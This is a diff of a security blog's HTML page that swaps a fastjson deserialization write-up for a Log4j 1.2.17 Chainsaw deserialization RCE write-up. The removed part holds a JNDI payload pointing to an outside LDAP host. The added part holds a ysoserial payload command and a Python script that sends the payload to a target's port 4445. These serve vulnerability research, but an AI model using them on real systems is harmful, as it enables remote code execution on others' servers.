@@ -4,31 +4,27 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>某数据分析平台fastjson反序列化 | novy&#39;s Blog</title>
+    <title>Log4j1.2.17 RCE | novy&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="novy&#39;s Blog">
     
 
     
-    <meta name="description" content="某数据分析平台反序列化">
+    <meta name="description" content="Attackers can use this vulnerability as a backdoor to maintain permissions.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="某数据分析平台fastjson反序列化">
-<meta property="og:url" content="http://example.com/2020/11/21/37/index.html">
+<meta property="og:title" content="Log4j1.2.17 RCE">
+<meta property="og:url" content="http://example.com/2021/10/28/63/index.html">
 <meta property="og:site_name" content="novy&#39;s Blog">
-<meta property="og:description" content="某数据分析平台反序列化">
+<meta property="og:description" content="Attackers can use this vulnerability as a backdoor to maintain permissions.">
 <meta property="og:locale">
-<meta property="og:image" content="http://example.com/images/37/1.png">
-<meta property="og:image" content="http://example.com/images/37/2.png">
-<meta property="og:image" content="http://example.com/images/37/3.png">
-<meta property="og:image" content="http://example.com/images/37/4.png">
-<meta property="og:image" content="http://example.com/images/37/5.png">
-<meta property="article:published_time" content="2020-11-21T03:14:21.000Z">
-<meta property="article:modified_time" content="2021-01-22T09:04:37.962Z">
+<meta property="og:image" content="http://example.com/images/63/1.png">
+<meta property="article:published_time" content="2021-10-28T10:24:21.000Z">
+<meta property="article:modified_time" content="2021-10-28T01:19:44.701Z">
 <meta property="article:author" content="novy&#39;s Blog">
-<meta property="article:tag" content="fastjson反序列化">
+<meta property="article:tag" content="JAVA反序列化">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/37/1.png">
+<meta name="twitter:image" content="http://example.com/images/63/1.png">
 
     
     <link rel="alternative" href="/atom.xml" title="novy&#39;s Blog" type="application/atom+xml">
@@ -92,14 +88,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2020/11/21/37/" title="某数据分析平台fastjson反序列化" itemprop="url">某数据分析平台fastjson反序列化</a>
+      <a href="/2021/10/28/63/" title="Log4j1.2.17 RCE" itemprop="url">Log4j1.2.17 RCE</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="novy&#39;s Blog" target="_blank" itemprop="author">novy&#39;s Blog</a>
 		
   <p class="article-time">
-    <time datetime="2020-11-21T03:14:21.000Z" itemprop="datePublished"> Published 2020-11-21</time>
+    <time datetime="2021-10-28T10:24:21.000Z" itemprop="datePublished"> Published 2021-10-28</time>
     
   </p>
 </header>
@@ -108,17 +104,35 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">代码分析：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">漏洞验证：</span></a></li></ol>
+			
 		
 		</div>
 		
-		<h1 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h1><p>src/main/java/org/xxxxx/controller/CommonsController.java 49行<br>这里用了一个@RequestBody注解，获取整个请求体进行反序列化<br><img src="/images/37/1.png"><br>查看Fastjson版本：<br><img src="/images/37/2.png"></p>
-<h1 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h1><p>因为没有演示环境而且这个社区版启动会报错，所以直接仿此处写个小靶场<br>创建一个springmvc web项目，pom中引入组件<br><img src="/images/37/3.png"><br>新建利用类<br><img src="/images/37/4.png"></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/test&quot;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">persist</span><span class="params">(<span class="meta">@RequestBody</span> String dataStr)</span> </span>&#123;</span><br><span class="line">       JSONObject data = JSONObject.parseObject(dataStr);</span><br><span class="line">       <span class="keyword">return</span> dataStr;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+		<p>Vulnerability discovered in early 2020.</p>
+<p>Unlike CVE-2019-17571, the vulnerability I found is located in class LoggingReceiver <code>org.apache.log4j.chainsaw.LoggingReceiver</code> .<br>(According to the disclosed CVE-2019-17571 vulnerability details, the location of his vulnerability occurred at org.apache.log4j.net.SocketNode). </p>
+<p>Vulnerability analysis:<br>Set the listening port in the setupReceiver method on line 133 of src/main/java/org/apache/log4j/chainsaw/Main.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setupReceiver</span><span class="params">(MyTableModel aModel)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">4445</span>;</span><br><span class="line">        String strRep = System.getProperty(<span class="string">&quot;chainsaw.port&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (strRep != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                port = Integer.parseInt(strRep);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NumberFormatException var6) &#123;</span><br><span class="line">                LOG.fatal(<span class="string">&quot;Unable to parse chainsaw.port property with value &quot;</span>+ strRep + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">                JOptionPane.showMessageDialog(<span class="keyword">this</span>, <span class="string">&quot;Unable to parse port number from&#x27;&quot;</span> + strRep + <span class="string">&quot;&#x27;, quitting.&quot;</span>, <span class="string">&quot;CHAINSAW&quot;</span>, <span class="number">0</span>);</span><br><span class="line">                System.exit(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Then go to the LoggingReceiver class to process related connection information:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            LoggingReceiver lr = <span class="keyword">new</span> LoggingReceiver(aModel, port);</span><br><span class="line">            lr.start();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Follow up LoggingReceiver class,start to get the data in the run method, encapsulate the mClient data into the ObjectInputStream object, and force the type to be converted to the LoggingEvent object when deserializing the ois:<br>src/main/java/org/apache/log4j/chainsaw/LoggingReceiver.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            LoggingReceiver.LOG.debug(<span class="string">&quot;Starting to get data&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">this</span>.mClient.getInputStream());</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                    LoggingEvent event = (LoggingEvent)ois.readObject();</span><br><span class="line">                    LoggingReceiver.<span class="keyword">this</span>.mModel.addEvent(<span class="keyword">new</span> EventDetails(event));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>There is an implementation of defaultReadObject in LoggingEvent class:<br>src/main/java/org/apache/log4j/spi/LoggingEvent.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span></span></span><br><span class="line"><span class="function">                      <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">  ois.defaultReadObject();</span><br><span class="line">  readLevel(ois);</span><br></pre></td></tr></table></figure>
+<p>Deserializing the ois object in the readLevel method triggers the vulnerability:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readLevel</span><span class="params">(ObjectInputStream ois)</span></span></span><br><span class="line"><span class="function">                      <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> p = ois.readInt();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      String className = (String) ois.readObject();</span><br></pre></td></tr></table></figure>
 
-<p>Payload：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://192.168.83.11:1389/o=tomcat&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;&#125;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
-<p>发送请求<br><img src="/images/37/5.png"></p>
+<p>Vulnerability verification:<br>Start the visualization component</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp log4j-1.2.17.jar org.apache.log4j.chainsaw.Main</span><br></pre></td></tr></table></figure>
+<p>Sending the payload generated by ysoserial (<a target="_blank" rel="noopener" href="https://github.com/angelwhu/ysoserial">https://github.com/angelwhu/ysoserial</a>) to port 4445 of the target can trigger the vulnerability.</p>
+<p>eg, generate malicious data exp.ser first:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar Jdk7u21 <span class="string">&quot;calc&quot;</span> &gt; exp.ser</span><br></pre></td></tr></table></figure>
+
+<p>Write a python socket client after generating the data:</p>
+<p>exp.py:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket()</span><br><span class="line">host = <span class="string">&quot;172.20.10.14&quot;</span><span class="comment">#target ip</span></span><br><span class="line">port = <span class="number">4445</span><span class="comment">#The listening port set by the component</span></span><br><span class="line">s.connect((host,port))</span><br><span class="line">ssss = <span class="built_in">open</span>(<span class="string">&quot;exp.ser&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)//Malicious data</span><br><span class="line">xc = ssss.read()</span><br><span class="line">s.send(xc)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<p>running exp.py can trigger the vulnerability.</p>
+<p><img src="/images/63/1.png"></p>
+<p>CVE-2019-17571 refer to:<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1829640" title="log4j反序列化漏洞分析">log4j反序列化漏洞分析</a></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -126,13 +140,13 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+  <a class="article-category-link" href="/categories/JAVA/">JAVA</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/fastjson反序列化/">fastjson反序列化</a>
+  <span></span> <a href="/tags/JAVA反序列化/">JAVA反序列化</a>
   </div>
 
 </div>
@@ -141,7 +155,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://example.com/2020/11/21/37/" data-title="某数据分析平台fastjson反序列化 | novy&#39;s Blog" data-tsina="" class="share clearfix">
+	  <div data-url="http://example.com/2021/10/28/63/" data-title="Log4j1.2.17 RCE | novy&#39;s Blog" data-tsina="" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -154,19 +168,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2020/11/26/39/" title="某大型框架登陆存储型XSS">
-  <strong>上一篇：</strong><br/>
-  <span>
-  某大型框架登陆存储型XSS</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2020/11/20/36/"  title="mblog4.0存储型XSS+权限绕过">
+<a href="/2021/09/16/62/"  title="能直接使用的内存马学习-filter篇">
  <strong>下一篇：</strong><br/> 
- <span>mblog4.0存储型XSS+权限绕过
+ <span>能直接使用的内存马学习-filter篇
 </span>
 </a>
 </div>
@@ -183,7 +189,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
  
- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">代码分析：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">漏洞验证：</span></a></li></ol>
+ 
  
   </div>
 
